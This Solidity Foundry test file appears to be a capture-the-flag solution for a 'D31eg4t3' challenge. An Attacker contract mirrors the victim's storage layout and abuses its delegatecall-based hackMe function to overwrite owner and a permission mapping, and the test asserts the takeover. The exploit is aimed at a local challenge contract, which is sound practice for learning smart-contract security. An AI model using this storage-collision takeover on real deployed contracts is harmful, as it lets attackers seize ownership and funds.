// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {D31eg4t3} from "./challenge/D3l3g4t3.sol";

contract Attacker {
    /// Storage slot setup should be same as the victim
    uint256 a = 12345;
    uint8 b = 32;
    string private d; // Super Secret data.
    uint32 private c; // Super Secret data.
    string private mot; // Super Secret data.
    address public owner;
    mapping(address => bool) public canYouHackMe;

    function overwriteStorage(address _attacker) external {
        owner = _attacker;
        canYouHackMe[_attacker] = true;
    }

    function attack(address target) external {
        target.call(
            abi.encodeWithSignature(
                "hackMe(bytes)", abi.encodeWithSignature("overwriteStorage(address)", address(this))
            )
        );
    }
}

contract ExploitTest is Test {
    address playerAddr = makeAddr("player");
    D31eg4t3 delegate;

    function setUp() public {
        delegate = new D31eg4t3();
    }

    function testExploit() external {
        vm.startPrank(playerAddr, playerAddr);
        Attacker attacker = new Attacker();
        attacker.attack(address(delegate));
        assertEq(delegate.canYouHackMe(address(attacker)), true);
        assertEq(delegate.owner(), address(attacker));
        vm.stopPrank();
    }
}
